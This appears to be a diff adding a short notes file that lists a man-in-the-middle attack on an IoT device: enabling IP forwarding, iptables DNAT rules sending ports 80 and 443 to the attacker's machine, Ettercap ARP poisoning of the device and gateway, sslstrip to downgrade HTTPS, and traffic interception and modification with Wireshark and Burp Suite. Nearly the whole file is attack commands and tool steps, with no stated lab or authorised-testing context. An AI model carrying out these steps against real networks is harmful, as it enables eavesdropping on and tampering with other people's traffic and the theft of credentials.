@@ -1,0 +1,44 @@
+Enable Routing
+---------------
+1.) echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Configure IP Tables
+-------------------
+2.) iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination x.x.x.x(your IP)
+3.) iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination x.x.x.x(your IP)
+
+Check IP Tables
+---------------
+4.) iptables -t nat -L
+
+ARP Poision
+-----------------
+5.) Open Ettercap as sudo
+    5.1.) sudo ettercap -G
+    5.2.) Select Unified Sniffing in specified interface
+    5.3.) Scan Host 
+    5.4.) List the host
+    5.5.) Select IOT device as Target 1
+    5.6.) Select gateway as Target 2 
+
+6.) Under Attack
+--------------
+    6.1.) Arp Poisioning Attacking
+        6.1.1.) one way sniffing
+
+SSL Strip (Https -> Http)
+-------------------------
+7.) sslstrip -l 80
+8.) sslstrip -l 443
+
+Listen IOT Device
+-----------------
+10.) Wireshark 
+
+Intercep & Modify network packets IOT devices send/receive
+-----------------------------------------------
+11.) Burpsuite (open as root)
+    11.1.) Proxy -> Options -> Proxy Listener ->Listen on port 80 and 443 
+    11.2.) enable support invisible proxying
+12.) Intercepting the networking packets works now
+
